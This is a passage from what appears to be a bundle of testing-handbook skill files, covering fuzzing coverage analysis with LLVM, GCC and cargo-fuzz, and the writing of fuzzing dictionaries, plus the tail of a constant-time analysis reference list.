\n                         (this skill)        \n                    \n                                \n                \n                                               \n                                               \n               \n          dudect                       timecop       \n      (statistical)                   (dynamic)      \n               \n                                            \n             \n                             \n                             \n              \n                 Supporting Techniques      \n               coverage, CI integration     \n              \n```\n\n## Resources\n\n### Key External Resources\n\n**[These results must be false: A usability evaluation of constant-time analysis tools](https://www.usenix.org/system/files/sec24fall-prepub-760-fourne.pdf)**\nComprehensive usability study of constant-time analysis tools. Key findings: developers struggle with false positives, need better error messages, and benefit from tool integration. Evaluates FaCT, ct-verif, dudect, and Memsan across multiple cryptographic implementations. Recommends improved tooling UX and better documentation.\n\n**[List of constant-time tools - CROCS](https://crocs-muni.github.io/ct-tools/)**\nCurated catalog of constant-time analysis tools with tutorials. Covers formal tools (ct-verif, FaCT), dynamic tools (Memsan, Timecop), symbolic tools (Binsec), and statistical tools (dudect). Includes practical tutorials for setup and usage.\n\n**[Paul Kocher: Timing Attacks on Implementations of Diffie-Hellman, RSA, DSS, and Other Systems](https://paulkocher.com/doc/TimingAttacks.pdf)**\nOriginal 1996 paper introducing timing attacks. Demonstrates attacks on modular exponentiation in RSA and Diffie-Hellman. Essential historical context for understanding timing vulnerabilities.\n\n**[Remote Timing Attacks are Practical (Brumley & Boneh)](https://crypto.stanford.edu/~dabo/papers/ssl-timing.pdf)**\nDemonstrates practical remote timing attacks against OpenSSL. Shows network-level timing differences are sufficient to extract RSA keys. Proves timing attacks work in realistic network conditions.\n\n**[Cache-timing attacks on AES](https://cr.yp.to/antiforgery/cachetiming-20050414.pdf)**\nShows AES implementations using lookup tables are vulnerable to cache-timing attacks. Demonstrates practical attacks extracting AES keys via cache timing side channels.\n\n**[KyberSlash: Division Timings Leak Secrets](https://eprint.iacr.org/2024/1049.pdf)**\nRecent discovery of timing vulnerabilities in Kyber (NIST post-quantum standard). Shows division operations leak secret coefficients. Highlights that constant-time issues persist even in modern post-quantum cryptography.\n\n### Video Resources\n\n- [Trail of Bits: Constant-Time Programming](https://www.youtube.com/watch?v=vW6wqTzfz5g) - Overview of constant-time programming principles and tools\n",
        "plugins/testing-handbook-skills/skills/coverage-analysis/SKILL.md": "---\nname: coverage-analysis\ntype: technique\ndescription: >\n  Coverage analysis measures code exercised during fuzzing.\n  Use when assessing harness effectiveness or identifying fuzzing blockers.\n---\n\n# Coverage Analysis\n\nCoverage analysis is essential for understanding which parts of your code are exercised during fuzzing. It helps identify fuzzing blockers like magic value checks and tracks the effectiveness of harness improvements over time.\n\n## Overview\n\nCode coverage during fuzzing serves two critical purposes:\n\n1. **Assessing harness effectiveness**: Understand which parts of your application are actually executed by your fuzzing harnesses\n2. **Tracking fuzzing progress**: Monitor how coverage changes when updating harnesses, fuzzers, or the system under test (SUT)\n\nCoverage is a proxy for fuzzer capability and performance. While coverage [is not ideal for measuring fuzzer performance](https://arxiv.org/abs/1808.09700) in absolute terms, it reliably indicates whether your harness works effectively in a given setup.\n\n### Key Concepts\n\n| Concept | Description |\n|---------|-------------|\n| **Coverage instrumentation** | Compiler flags that track which code paths are executed |\n| **Corpus coverage** | Coverage achieved by running all test cases in a fuzzing corpus |\n| **Magic value checks** | Hard-to-discover conditional checks that block fuzzer progress |\n| **Coverage-guided fuzzing** | Fuzzing strategy that prioritizes inputs that discover new code paths |\n| **Coverage report** | Visual or textual representation of executed vs. unexecuted code |\n\n## When to Apply\n\n**Apply this technique when:**\n- Starting a new fuzzing campaign to establish a baseline\n- Fuzzer appears to plateau without finding new paths\n- After harness modifications to verify improvements\n- When migrating between different fuzzers\n- Identifying areas requiring dictionary entries or seed inputs\n- Debugging why certain code paths aren't reached\n\n**Skip this technique when:**\n- Fuzzing campaign is actively finding crashes\n- Coverage infrastructure isn't set up yet\n- Working with extremely large codebases where full coverage reports are impractical\n- Fuzzer's internal coverage metrics are sufficient for your needs\n\n## Quick Reference\n\n| Task | Command/Pattern |\n|------|-----------------|\n| LLVM coverage instrumentation (C/C++) | `-fprofile-instr-generate -fcoverage-mapping` |\n| GCC coverage instrumentation | `-ftest-coverage -fprofile-arcs` |\n| cargo-fuzz coverage (Rust) | `cargo +nightly fuzz coverage <target>` |\n| Generate LLVM profile data | `llvm-profdata merge -sparse file.profraw -o file.profdata` |\n| LLVM coverage report | `llvm-cov report ./binary -instr-profile=file.profdata` |\n| LLVM HTML report | `llvm-cov show ./binary -instr-profile=file.profdata -format=html -output-dir html/` |\n| gcovr HTML report | `gcovr --html-details -o coverage.html` |\n\n## Ideal Coverage Workflow\n\nThe following workflow represents best practices for integrating coverage analysis into your fuzzing campaigns:\n\n```\n[Fuzzing Campaign]\n       |\n       v\n[Generate Corpus]\n       |\n       v\n[Coverage Analysis]\n       |\n       +---> Coverage Increased? --> Continue fuzzing with larger corpus\n       |\n       +---> Coverage Decreased? --> Fix harness or investigate SUT changes\n       |\n       +---> Coverage Plateaued? --> Add dictionary entries or seed inputs\n```\n\n**Key principle**: Use the corpus generated *after* each fuzzing campaign to calculate coverage, rather than real-time fuzzer statistics. This approach provides reproducible, comparable measurements across different fuzzing tools.\n\n## Step-by-Step\n\n### Step 1: Build with Coverage Instrumentation\n\nChoose your instrumentation method based on toolchain:\n\n**LLVM/Clang (C/C++):**\n```bash\nclang++ -fprofile-instr-generate -fcoverage-mapping \\\n  -O2 -DNO_MAIN \\\n  main.cc harness.cc execute-rt.cc -o fuzz_exec\n```\n\n**GCC (C/C++):**\n```bash\ng++ -ftest-coverage -fprofile-arcs \\\n  -O2 -DNO_MAIN \\\n  main.cc harness.cc execute-rt.cc -o fuzz_exec_gcov\n```\n\n**Rust:**\n```bash\nrustup toolchain install nightly --component llvm-tools-preview\ncargo +nightly fuzz coverage fuzz_target_1\n```\n\n### Step 2: Create Execution Runtime (C/C++ only)\n\nFor C/C++ projects, create a runtime that executes your corpus:\n\n```cpp\n// execute-rt.cc\n#include <stdio.h>\n#include <stdlib.h>\n#include <dirent.h>\n#include <stdint.h>\n\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size);\n\nvoid load_file_and_test(const char *filename) {\n    FILE *file = fopen(filename, \"rb\");\n    if (file == NULL) {\n        printf(\"Failed to open file: %s\\n\", filename);\n        return;\n    }\n\n    fseek(file, 0, SEEK_END);\n    long filesize = ftell(file);\n    rewind(file);\n\n    uint8_t *buffer = (uint8_t*) malloc(filesize);\n    if (buffer == NULL) {\n        printf(\"Failed to allocate memory for file: %s\\n\", filename);\n        fclose(file);\n        return;\n    }\n\n    long read_size = (long) fread(buffer, 1, filesize, file);\n    if (read_size != filesize) {\n        printf(\"Failed to read file: %s\\n\", filename);\n        free(buffer);\n        fclose(file);\n        return;\n    }\n\n    LLVMFuzzerTestOneInput(buffer, filesize);\n\n    free(buffer);\n    fclose(file);\n}\n\nint main(int argc, char **argv) {\n    if (argc != 2) {\n        printf(\"Usage: %s <directory>\\n\", argv[0]);\n        return 1;\n    }\n\n    DIR *dir = opendir(argv[1]);\n    if (dir == NULL) {\n        printf(\"Failed to open directory: %s\\n\", argv[1]);\n        return 1;\n    }\n\n    struct dirent *entry;\n    while ((entry = readdir(dir)) != NULL) {\n        if (entry->d_type == DT_REG) {\n            char filepath[1024];\n            snprintf(filepath, sizeof(filepath), \"%s/%s\", argv[1], entry->d_name);\n            load_file_and_test(filepath);\n        }\n    }\n\n    closedir(dir);\n    return 0;\n}\n```\n\n### Step 3: Execute on Corpus\n\n**LLVM (C/C++):**\n```bash\nLLVM_PROFILE_FILE=fuzz.profraw ./fuzz_exec corpus/\n```\n\n**GCC (C/C++):**\n```bash\n./fuzz_exec_gcov corpus/\n```\n\n**Rust:**\nCoverage data is automatically generated when running `cargo fuzz coverage`.\n\n### Step 4: Process Coverage Data\n\n**LLVM:**\n```bash\n# Merge raw profile data\nllvm-profdata merge -sparse fuzz.profraw -o fuzz.profdata\n\n# Generate text report\nllvm-cov report ./fuzz_exec \\\n  -instr-profile=fuzz.profdata \\\n  -ignore-filename-regex='harness.cc|execute-rt.cc'\n\n# Generate HTML report\nllvm-cov show ./fuzz_exec \\\n  -instr-profile=fuzz.profdata \\\n  -ignore-filename-regex='harness.cc|execute-rt.cc' \\\n  -format=html -output-dir fuzz_html/\n```\n\n**GCC with gcovr:**\n```bash\n# Install gcovr (via pip for latest version)\npython3 -m venv venv\nsource venv/bin/activate\npip3 install gcovr\n\n# Generate report\ngcovr --gcov-executable \"llvm-cov gcov\" \\\n  --exclude harness.cc --exclude execute-rt.cc \\\n  --root . --html-details -o coverage.html\n```\n\n**Rust:**\n```bash\n# Install required tools\ncargo install cargo-binutils rustfilt\n\n# Create HTML generation script\ncat <<'EOF' > ./generate_html\n#!/bin/sh\nif [ $# -lt 1 ]; then\n    echo \"Error: Name of fuzz target is required.\"\n    echo \"Usage: $0 fuzz_target [sources...]\"\n    exit 1\nfi\nFUZZ_TARGET=\"$1\"\nshift\nSRC_FILTER=\"$@\"\nTARGET=$(rustc -vV | sed -n 's|host: ||p')\ncargo +nightly cov -- show -Xdemangler=rustfilt \\\n  \"target/$TARGET/coverage/$TARGET/release/$FUZZ_TARGET\" \\\n  -instr-profile=\"fuzz/coverage/$FUZZ_TARGET/coverage.profdata\" \\\n  -show-line-counts-or-regions -show-instantiations \\\n  -format=html -o fuzz_html/ $SRC_FILTER\nEOF\nchmod +x ./generate_html\n\n# Generate HTML report\n./generate_html fuzz_target_1 src/lib.rs\n```\n\n### Step 5: Analyze Results\n\nReview the coverage report to identify:\n\n- **Uncovered code blocks**: Areas that may need better seed inputs or dictionary entries\n- **Magic value checks**: Conditional statements with hardcoded values that block progress\n- **Dead code**: Functions that may not be reachable through your harness\n- **Coverage changes**: Compare against baseline to track improvements or regressions\n\n## Common Patterns\n\n### Pattern: Identifying Magic Values\n\n**Problem**: Fuzzer cannot discover paths guarded by magic value checks.\n\n**Coverage reveals:**\n```cpp\n// Coverage shows this block is never executed\nif (buf == 0x7F454C46) {  // ELF magic number\n    // start parsing buf\n}\n```\n\n**Solution**: Add magic values to dictionary file:\n```\n# magic.dict\n\"\\x7F\\x45\\x4C\\x46\"\n```\n\n### Pattern: Handling Crashing Inputs\n\n**Problem**: Coverage generation fails when corpus contains crashing inputs.\n\n**Before:**\n```bash\n./fuzz_exec corpus/  # Crashes on bad input, no coverage generated\n```\n\n**After:**\n```cpp\n// Fork before executing to isolate crashes\nint main(int argc, char **argv) {\n    // ... directory opening code ...\n\n    while ((entry = readdir(dir)) != NULL) {\n        if (entry->d_type == DT_REG) {\n            pid_t pid = fork();\n            if (pid == 0) {\n                // Child process - crash won't affect parent\n                char filepath[1024];\n                snprintf(filepath, sizeof(filepath), \"%s/%s\", argv[1], entry->d_name);\n                load_file_and_test(filepath);\n                exit(0);\n            } else {\n                // Parent waits for child\n                waitpid(pid, NULL, 0);\n            }\n        }\n    }\n}\n```\n\n### Pattern: CMake Integration\n\n**Use Case**: Adding coverage builds to CMake projects.\n\n```cmake\nproject(FuzzingProject)\ncmake_minimum_required(VERSION 3.0)\n\n# Main binary\nadd_executable(program main.cc)\n\n# Fuzzing binary\nadd_executable(fuzz main.cc harness.cc)\ntarget_compile_definitions(fuzz PRIVATE NO_MAIN=1)\ntarget_compile_options(fuzz PRIVATE -g -O2 -fsanitize=fuzzer)\ntarget_link_libraries(fuzz -fsanitize=fuzzer)\n\n# Coverage execution binary\nadd_executable(fuzz_exec main.cc harness.cc execute-rt.cc)\ntarget_compile_definitions(fuzz_exec PRIVATE NO_MAIN)\ntarget_compile_options(fuzz_exec PRIVATE -O2 -fprofile-instr-generate -fcoverage-mapping)\ntarget_link_libraries(fuzz_exec -fprofile-instr-generate)\n```\n\nBuild:\n```bash\ncmake -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++ .\ncmake --build . --target fuzz_exec\n```\n\n## Advanced Usage\n\n### Tips and Tricks\n\n| Tip | Why It Helps |\n|-----|--------------|\n| Use LLVM 18+ with `-show-directory-coverage` | Organizes large reports by directory structure instead of flat file list |\n| Export to lcov format for better HTML | `llvm-cov export -format=lcov` + `genhtml` provides cleaner per-file reports |\n| Compare coverage across campaigns | Store `.profdata` files with timestamps to track progress over time |\n| Filter harness code from reports | Use `-ignore-filename-regex` to focus on SUT coverage only |\n| Automate coverage in CI/CD | Generate coverage reports automatically after scheduled fuzzing runs |\n| Use gcovr 5.1+ for Clang 14+ | Older gcovr versions have compatibility issues with recent LLVM |\n\n### Incremental Coverage Updates\n\nGCC's gcov instrumentation incrementally updates `.gcda` files across multiple runs. This is useful for tracking coverage as you add test cases:\n\n```bash\n# First run\n./fuzz_exec_gcov corpus_batch_1/\ngcovr --html coverage_v1.html\n\n# Second run (adds to existing coverage)\n./fuzz_exec_gcov corpus_batch_2/\ngcovr --html coverage_v2.html\n\n# Start fresh\ngcovr --delete  # Remove .gcda files\n./fuzz_exec_gcov corpus/\n```\n\n### Handling Large Codebases\n\nFor projects with hundreds of source files:\n\n1. **Filter by prefix**: Only generate reports for relevant directories\n   ```bash\n   llvm-cov show ./fuzz_exec -instr-profile=fuzz.profdata /path/to/src/\n   ```\n\n2. **Use directory coverage**: Group by directory to reduce clutter (LLVM 18+)\n   ```bash\n   llvm-cov show -show-directory-coverage -format=html -output-dir html/\n   ```\n\n3. **Generate JSON for programmatic analysis**:\n   ```bash\n   llvm-cov export -format=lcov > coverage.json\n   ```\n\n### Differential Coverage\n\nCompare coverage between two fuzzing campaigns:\n\n```bash\n# Campaign 1\nLLVM_PROFILE_FILE=campaign1.profraw ./fuzz_exec corpus1/\nllvm-profdata merge -sparse campaign1.profraw -o campaign1.profdata\n\n# Campaign 2\nLLVM_PROFILE_FILE=campaign2.profraw ./fuzz_exec corpus2/\nllvm-profdata merge -sparse campaign2.profraw -o campaign2.profdata\n\n# Compare\nllvm-cov show ./fuzz_exec \\\n  -instr-profile=campaign2.profdata \\\n  -instr-profile=campaign1.profdata \\\n  -show-line-counts-or-regions\n```\n\n## Anti-Patterns\n\n| Anti-Pattern | Problem | Correct Approach |\n|--------------|---------|------------------|\n| Using fuzzer-reported coverage for comparisons | Different fuzzers calculate coverage differently, making cross-tool comparison meaningless | Use dedicated coverage tools (llvm-cov, gcovr) for reproducible measurements |\n| Generating coverage with optimizations | `-O3` optimizations can eliminate code, making coverage misleading | Use `-O2` or `-O0` for coverage builds |\n| Not filtering harness code | Harness coverage inflates numbers and obscures SUT coverage | Use `-ignore-filename-regex` or `--exclude` to filter harness files |\n| Mixing LLVM and GCC instrumentation | Incompatible formats cause parsing failures | Stick to one toolchain for coverage builds |\n| Ignoring crashing inputs | Crashes prevent coverage generation, hiding real coverage data | Fix crashes first, or use process forking to isolate them |\n| Not tracking coverage over time | One-time coverage checks miss regressions and improvements | Store coverage data with timestamps and track trends |\n\n## Tool-Specific Guidance\n\n### libFuzzer\n\nlibFuzzer uses LLVM's SanitizerCoverage by default for guiding fuzzing, but you need separate instrumentation for generating reports.\n\n**Build for coverage:**\n```bash\nclang++ -fprofile-instr-generate -fcoverage-mapping \\\n  -O2 -DNO_MAIN \\\n  main.cc harness.cc execute-rt.cc -o fuzz_exec\n```\n\n**Execute corpus and generate report:**\n```bash\nLLVM_PROFILE_FILE=fuzz.profraw ./fuzz_exec corpus/\nllvm-profdata merge -sparse fuzz.profraw -o fuzz.profdata\nllvm-cov show ./fuzz_exec -instr-profile=fuzz.profdata -format=html -output-dir html/\n```\n\n**Integration tips:**\n- Don't use `-fsanitize=fuzzer` for coverage builds (it conflicts with profile instrumentation)\n- Reuse the same harness function (`LLVMFuzzerTestOneInput`) with a different main function\n- Use the `-ignore-filename-regex` flag to exclude harness code from coverage reports\n- Consider using llvm-cov's `-show-instantiation` flag for template-heavy C++ code\n\n### AFL++\n\nAFL++ provides its own coverage feedback mechanism, but for detailed reports use standard LLVM/GCC tools.\n\n**Build for coverage with LLVM:**\n```bash\nclang++ -fprofile-instr-generate -fcoverage-mapping \\\n  -O2 main.cc harness.cc execute-rt.cc -o fuzz_exec\n```\n\n**Build for coverage with GCC:**\n```bash\nAFL_USE_ASAN=0 afl-gcc -ftest-coverage -fprofile-arcs \\\n  main.cc harness.cc execute-rt.cc -o fuzz_exec_gcov\n```\n\n**Execute and generate report:**\n```bash\n# LLVM approach\nLLVM_PROFILE_FILE=fuzz.profraw ./fuzz_exec afl_output/queue/\nllvm-profdata merge -sparse fuzz.profraw -o fuzz.profdata\nllvm-cov report ./fuzz_exec -instr-profile=fuzz.profdata\n\n# GCC approach\n./fuzz_exec_gcov afl_output/queue/\ngcovr --html-details -o coverage.html\n```\n\n**Integration tips:**\n- Don't use AFL++'s instrumentation (`afl-clang-fast`) for coverage builds\n- Use standard compilers with coverage flags instead\n- AFL++'s `queue/` directory contains your corpus\n- AFL++'s built-in coverage statistics are useful for real-time monitoring but not for detailed analysis\n\n### cargo-fuzz (Rust)\n\ncargo-fuzz provides built-in coverage generation using LLVM tools.\n\n**Install prerequisites:**\n```bash\nrustup toolchain install nightly --component llvm-tools-preview\ncargo install cargo-binutils rustfilt\n```\n\n**Generate coverage data:**\n```bash\ncargo +nightly fuzz coverage fuzz_target_1\n```\n\n**Create HTML report script:**\n```bash\ncat <<'EOF' > ./generate_html\n#!/bin/sh\nFUZZ_TARGET=\"$1\"\nshift\nSRC_FILTER=\"$@\"\nTARGET=$(rustc -vV | sed -n 's|host: ||p')\ncargo +nightly cov -- show -Xdemangler=rustfilt \\\n  \"target/$TARGET/coverage/$TARGET/release/$FUZZ_TARGET\" \\\n  -instr-profile=\"fuzz/coverage/$FUZZ_TARGET/coverage.profdata\" \\\n  -show-line-counts-or-regions -show-instantiations \\\n  -format=html -o fuzz_html/ $SRC_FILTER\nEOF\nchmod +x ./generate_html\n```\n\n**Generate report:**\n```bash\n./generate_html fuzz_target_1 src/lib.rs\n```\n\n**Integration tips:**\n- Always use the nightly toolchain for coverage\n- The `-Xdemangler=rustfilt` flag makes function names readable\n- Filter by source files (e.g., `src/lib.rs`) to focus on crate code\n- Use `-show-line-counts-or-regions` and `-show-instantiations` for better Rust-specific output\n- Corpus is located in `fuzz/corpus/<target>/`\n\n### honggfuzz\n\nhonggfuzz works with standard LLVM/GCC coverage instrumentation.\n\n**Build for coverage:**\n```bash\n# Use standard compiler, not honggfuzz compiler\nclang -fprofile-instr-generate -fcoverage-mapping \\\n  -O2 harness.c execute-rt.c -o fuzz_exec\n```\n\n**Execute corpus:**\n```bash\nLLVM_PROFILE_FILE=fuzz.profraw ./fuzz_exec honggfuzz_workspace/\n```\n\n**Integration tips:**\n- Don't use `hfuzz-clang` for coverage builds\n- honggfuzz corpus is typically in a workspace directory\n- Use the same LLVM workflow as libFuzzer\n\n## Troubleshooting\n\n| Issue | Cause | Solution |\n|-------|-------|----------|\n| `error: no profile data available` | Profile wasn't generated or wrong path | Verify `LLVM_PROFILE_FILE` was set and `.profraw` file exists |\n| `Failed to load coverage` | Mismatch between binary and profile data | Rebuild binary with same flags used during execution |\n| Coverage reports show 0% | Wrong binary used for report generation | Use the instrumented binary, not the fuzzing binary |\n| `no_working_dir_found` error (gcovr) | `.gcda` files in unexpected location | Add `--gcov-ignore-errors=no_working_dir_found` flag |\n| Crashes prevent coverage generation | Corpus contains crashing inputs | Filter crashes or use forking approach to isolate failures |\n| Coverage decreases after harness change | Harness now skips certain code paths | Review harness logic; may need to support more input formats |\n| HTML report is flat file list | Using older LLVM version | Upgrade to LLVM 18+ and use `-show-directory-coverage` |\n| `incompatible instrumentation` | Mixing LLVM and GCC coverage | Rebuild everything with same toolchain |\n\n## Related Skills\n\n### Tools That Use This Technique\n\n| Skill | How It Applies |\n|-------|----------------|\n| **libfuzzer** | Uses SanitizerCoverage for feedback; coverage analysis evaluates harness effectiveness |\n| **aflpp** | Uses edge coverage for feedback; detailed analysis requires separate instrumentation |\n| **cargo-fuzz** | Built-in `cargo fuzz coverage` command for Rust projects |\n| **honggfuzz** | Uses edge coverage; analyze with standard LLVM/GCC tools |\n\n### Related Techniques\n\n| Skill | Relationship |\n|-------|--------------|\n| **fuzz-harness-writing** | Coverage reveals which code paths harness reaches; guides harness improvements |\n| **fuzzing-dictionaries** | Coverage identifies magic value checks that need dictionary entries |\n| **corpus-management** | Coverage analysis helps curate corpora by identifying redundant test cases |\n| **sanitizers** | Coverage helps verify sanitizer-instrumented code is actually executed |\n\n## Resources\n\n### Key External Resources\n\n**[LLVM Source-Based Code Coverage](https://clang.llvm.org/docs/SourceBasedCodeCoverage.html)**\nComprehensive guide to LLVM's profile instrumentation, including advanced features like branch coverage, region coverage, and integration with existing build systems. Covers compiler flags, runtime behavior, and profile data formats.\n\n**[llvm-cov Command Guide](https://llvm.org/docs/CommandGuide/llvm-cov.html)**\nDetailed CLI reference for llvm-cov commands including `show`, `report`, and `export`. Documents all filtering options, output formats, and integration with llvm-profdata.\n\n**[gcovr Documentation](https://gcovr.com/)**\nComplete guide to gcovr tool for generating coverage reports from gcov data. Covers HTML themes, filtering options, multi-directory projects, and CI/CD integration patterns.\n\n**[SanitizerCoverage Documentation](https://clang.llvm.org/docs/SanitizerCoverage.html)**\nLow-level documentation for LLVM's SanitizerCoverage instrumentation. Explains inline 8-bit counters, PC tables, and how fuzzers use coverage feedback for guidance.\n\n**[On the Evaluation of Fuzzer Performance](https://arxiv.org/abs/1808.09700)**\nResearch paper examining limitations of coverage as a fuzzing performance metric. Argues for more nuanced evaluation methods beyond simple code coverage percentages.\n\n### Video Resources\n\nNot applicable - coverage analysis is primarily a tooling and workflow topic best learned through documentation and hands-on practice.\n",
        "plugins/testing-handbook-skills/skills/fuzzing-dictionary/SKILL.md": "---\nname: fuzzing-dictionary\ntype: technique\ndescription: >\n  Fuzzing dictionaries guide fuzzers with domain-specific tokens.\n  Use when fuzzing parsers, protocols, or format-specific code.\n---\n\n# Fuzzing Dictionary\n\nA fuzzing dictionary provides domain-specific tokens to guide the fuzzer toward interesting inputs. Instead of purely random mutations, the fuzzer incorporates known keywords, magic numbers, protocol commands, and format-specific strings that are more likely to reach deeper code paths in parsers, protocol handlers, and file format processors.\n\n## Overview\n\nDictionaries are text files containing quoted strings that represent meaningful tokens for your target. They help fuzzers bypass early validation checks and explore code paths that would be difficult to reach through blind mutation alone.\n\n### Key Concepts\n\n| Concept | Description |\n|---------|-------------|\n| **Dictionary Entry** | A quoted string (e.g., `\"keyword\"`) or key-value pair (e.g., `kw=\"value\"`) |\n| **Hex Escapes** | Byte sequences like `\"\\xF7\\xF8\"` for non-printable characters |\n| **Token Injection** | Fuzzer inserts dictionary entries into generated inputs |\n| **Cross-Fuzzer Format** | Dictionary files work with libFuzzer, AFL++, and cargo-fuzz |\n\n## When to Apply\n\n**Apply this technique when:**\n- Fuzzing parsers (JSON, XML, config files)\n- Fuzzing protocol implementations (HTTP, DNS, custom protocols)\n- Fuzzing file format handlers (PNG, PDF, media codecs)\n- Coverage plateaus early without reaching deeper logic\n- Target code checks for specific keywords or magic values\n\n**Skip this technique when:**\n- Fuzzing pure algorithms without format expectations\n- Target has no keyword-based parsing\n- Corpus already achieves high coverage\n\n## Quick Reference\n\n| Task | Command/Pattern |\n|------|-----------------|\n| Use with libFuzzer | `./fuzz -dict=./dictionary.dict ...` |\n| Use with AFL++ | `afl-fuzz -x ./dictionary.dict ...` |\n| Use with cargo-fuzz | `cargo fuzz run fuzz_target -- -dict=./dictionary.dict` |\n| Extract from header | `grep -o '\".*\"' header.h > header.dict` |\n| Generate from binary | `strings ./binary \\| sed 's/^/\"&/; s/$/&\"/' > strings.dict` |\n\n## Step-by-Step\n\n### Step 1: Create Dictionary File\n\nCreate a text file with quoted strings on each line. Use comments (`#`) for documentation.\n\n**Example dictionary format:**\n\n```conf\n# Lines starting with '#' and empty lines are ignored.\n\n# Adds \"blah\" (w/o quotes) to the dictionary.\nkw1=\"blah\"\n# Use \\\\ for backslash and \\\" for quotes.\nkw2=\"\\\"ac\\\\dc\\\"\"\n# Use \\xAB for hex values\nkw3=\"\\xF7\\xF8\"\n# the name of the keyword followed by '=' may be omitted:\n\"foo\\x0Abar\"\n```\n\n### Step 2: Generate Dictionary Content\n\nChoose a generation method based on what's available:\n\n**From LLM:** Prompt ChatGPT or Claude with:\n```text\nA dictionary can be used to guide the fuzzer. Write me a dictionary file for fuzzing a <PNG parser>. Each line should be a quoted string or key-value pair like kw=\"value\". Include magic bytes, chunk types, and common header values. Use hex escapes like \"\\xF7\\xF8\" for binary values.\n```\n\n**From header files:**\n```bash\ngrep -o '\".*\"' header.h > header.dict\n```\n\n**From man pages (for CLI tools):**\n```bash\nman curl | grep -oP '^\\s*(--|-)\\K\\S+' | sed 's/[,.]$//' | sed 's/^/\"&/; s/$/&\"/' | sort -u > man.dict\n```\n\n**From binary strings:**\n```bash\nstrings ./binary | sed 's/^/\"&/; s/$/&\"/' > strings.dict\n```\n\n### Step 3: Pass Dictionary to Fuzzer\n\nUse the appropriate flag for your fuzzer (see Quick Reference above).\n\n## Common Patterns\n\n### Pattern: Protocol Keywords\n\n**Use Case:** Fuzzing HTTP or custom protocol handlers\n\n**Dictionary content:**\n```conf\n# HTTP methods\n\"GET\"\n\"POST\"\n\"PUT\"\n\"DELETE\"\n\"HEAD\"\n\n# Headers\n\"Content-Type\"\n\"Authorization\"\n\"Host\"\n\n# Protocol markers\n\"HTTP/1.1\"\n\"HTTP/2.0\"\n```\n\n### Pattern: Magic Bytes and File Format Headers\n\n**Use Case:** Fuzzing image parsers, media decoders, archive handlers\n\n**Dictionary content:**\n```conf\n# PNG magic bytes and chunks\npng_magic=\"\\x89PNG\\r\\n\\x1a\\n\"\nihdr=\"IHDR\"\nplte=\"PLTE\"\nidat=\"IDAT\"\niend=\"IEND\"\n\n# JPEG markers\njpeg_soi=\"\\xFF\\xD8\"\njpeg_eoi=\"\\xFF\\xD9\"\n```\n\n### Pattern: Configuration File Keywords\n\n**Use Case:** Fuzzing config file parsers (YAML, TOML, INI)\n\n**Dictionary content:**\n```conf\n# Common config keywords\n\"true\"\n\"false\"\n\"null\"\n\"version\"\n\"enabled\"\n\"disabled\"\n\n# Section headers\n\"[general]\"\n\"[network]\"\n\"[security]\"\n```\n\n## Advanced Usage\n\n### Tips and Tricks\n\n| Tip | Why It Helps |\n|-----|--------------|\n| Combine multiple generation methods | LLM-generated keywords + strings from binary covers broad surface |\n| Include boundary values | `\"0\"`, `\"-1\"`, `\"2147483647\"` trigger edge cases |\n| Add format delimiters | `:`, `=`, `{`, `}` help fuzzer construct valid structures |\n| Keep dictionaries focused | 50-200 entries perform better than thousands |\n| Test dictionary effectiveness | Run with and without dict, compare coverage |\n\n### Auto-Generated Dictionaries (AFL++)\n\nWhen using `afl-clang-lto` compiler, AFL++ automatically extracts dictionary entries from string comparisons in the binary. This happens at compile time via the AUTODICTIONARY feature.\n\n**Enable auto-dictionary:**\n```bash\nexport AFL_LLVM_DICT2FILE=auto.dict\nafl-clang-lto++ target.cc -o target\n# Dictionary saved to auto.dict\nafl-fuzz -x auto.dict -i in -o out -- ./target\n```\n\n### Combining Multiple Dictionaries\n\nSome fuzzers support multiple dictionary files:\n\n```bash\n# AFL++ with multiple dictionaries\nafl-fuzz -x keywords.dict -x formats.dict -i in -o out -- ./target\n```\n\n## Anti-Patterns\n\n| Anti-Pattern | Problem | Correct Approach |\n|--------------|---------|------------------|\n| Including full sentences | Fuzzer needs atomic tokens, not prose | Break into individual keywords |\n| Duplicating entries | Wastes mutation budget | Use `sort -u` to deduplicate |\n| Over-sized dictionaries | Slows fuzzer, dilutes useful tokens | Keep focused: 50-200 most relevant entries |\n| Missing hex escapes | Non-printable bytes become mangled | Use `\\xXX` for binary values |\n| No comments | Hard to maintain and audit | Document sections with `#` comments |\n\n## Tool-Specific Guidance\n\n### libFuzzer\n\n```bash\nclang++ -fsanitize=fuzzer,address harness.cc -o fuzz\n./fuzz -dict=./dictionary.dict corpus/\n```\n\n**Integration tips:**\n- Dictionary tokens are inserted/replaced during mutations\n- Combine with `-max_len` to control input size\n- Use `-print_final_stats=1` to see dictionary effectiveness metrics\n- Dictionary entries longer than `-max_len` are ignored\n\n### AFL++\n\n```bash\nafl-fuzz -x ./dictionary.dict -i input/ -o output/ -- ./target @@\n```\n\n**Integration tips:**\n- AFL++ supports multiple `-x` flags for multiple dictionaries\n- Use `AFL_LLVM_DICT2FILE` with `afl-clang-lto` for auto-generated dictionaries\n- Dictionary effectiveness shown in fuzzer stats UI\n- Tokens are used during deterministic and havoc stages\n\n### cargo-fuzz (Rust)\n\n```bash\ncargo fuzz run fuzz_target -- -dict=./dictionary.dict\n```\n\n**Integration tips:**\n- cargo-fuzz uses libFuzzer backend, so all libFuzzer dict flags work\n- Place dictionary file in `fuzz/` directory alongside harness\n- Reference from harness directory: `cargo fuzz run target -- -dict=../dictionary.dict`\n\n### go-fuzz (Go)\n\ngo-fuzz does not have built-in dictionary support, but you can manually seed the corpus with dictionary entries:\n\n```bash\n# Convert dictionary to corpus files\ngrep -o '\".*\"' dict.txt | while read line; do\n    echo -n \"$line\" | base64 > corpus/$(echo \"$line\" | md5sum | cut -d' ' -f1)\ndone\n\ngo-fuzz -bin=./target-fuzz.zip -workdir=.\n```\n\n## Troubleshooting\n\n| Issue | Cause | Solution |\n|-------|-------|----------|\n| Dictionary file not loaded | Wrong path or format error | Check fuzzer output for dict parsing errors; verify file format |\n| No coverage improvement | Dictionary tokens not relevant | Analyze target code for actual keywords; try different generation method |\n| Syntax errors in dict file | Unescaped quotes or invalid escapes | Use `\\\\` for backslash, `\\\"` for quotes; validate with test run |\n| Fuzzer ignores long entries | Entries exceed `-max_len` | Keep entries under max input length, or increase `-max_len` |\n| Too many entries slow fuzzer | Dictionary too large | Prune to 50-200 most relevant entries |\n\n## Related Skills\n\n### Tools That Use This Technique\n\n| Skill | How It Applies 